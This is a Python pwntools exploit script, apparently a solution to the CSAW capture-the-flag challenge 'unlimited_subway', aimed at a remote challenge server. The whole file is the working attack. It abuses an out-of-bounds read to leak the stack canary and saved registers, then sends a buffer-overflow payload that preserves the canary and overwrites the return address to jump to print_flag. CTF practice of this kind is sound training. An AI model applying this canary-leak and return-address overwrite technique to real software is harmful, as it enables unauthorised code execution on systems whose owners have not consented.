from pwn import *

context.binary = ELF("share/unlimited_subway", checksec=False)
HOST = "pwn.chal.csaw.io"
PORT = 7900

def start():
    return remote(HOST, PORT)

def fill(p, data):
    p.recvuntil(b"> ")
    p.sendline(b"F")
    p.recvuntil(b"Data : ")
    p.send(data)

def view(p, idx):
    p.recvuntil(b"> ")
    p.sendline(b"V")
    p.recvuntil(b"Index : ")
    p.sendline(str(idx).encode())
    line = p.recvline().decode().strip()
    return int(line.split(":")[1].strip(), 16)

def exploit():
    p = start()

    fill(p, b"A" * 64)

    leak = [view(p, i) for i in range(64, 80)]
    print("leak:", leak)

    canary = bytes(leak[0:4])
    saved_ebx = bytes(leak[4:8])
    saved_ebp = bytes(leak[8:12])
    ret = u32(bytes(leak[12:16]))

    print("canary =", canary.hex())
    print("saved_ebx =", saved_ebx.hex())
    print("saved_ebp =", saved_ebp.hex())
    print("ret =", hex(ret))

    payload = b"A" * 64
    payload += canary
    payload += b"B" * 12
    payload += p32(context.binary.symbols["print_flag"])

    p.recvuntil(b"> ")
    p.sendline(b"E")
    p.recvuntil(b"Name Size : ")
    p.sendline(str(len(payload)).encode())
    p.recvuntil(b"Name : ")
    p.send(payload)

    print(p.recvall(timeout=3).decode("latin1", errors="ignore"))

if __name__ == "__main__":
    exploit()
end_of_edit
